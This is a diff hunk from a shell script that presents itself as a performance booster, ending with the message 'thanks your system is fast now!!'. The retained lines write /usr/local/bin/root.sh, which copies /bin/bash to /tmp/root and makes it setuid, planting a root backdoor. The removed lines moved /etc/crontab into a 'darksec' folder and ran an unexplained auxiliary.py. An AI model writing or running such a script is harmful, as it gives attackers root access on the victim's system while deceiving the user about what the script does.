@@ -39,15 +39,6 @@ chmod +x /usr/local/bin/root.sh
 echo "#\!/bin/bash" > /usr/local/bin/root.sh
 echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
 sleep 1
-cd /etc/
-mkdir darksec
-sleep 1
-mv /etc/crontab /etc/darksec/crontab
-sleep 1
-cd "$darksec"
-sleep 1
-python3 auxiliary.py
-sleep 1
 echo "wait..."
 sleep 3
 echo "thanks your system is fast now!!"
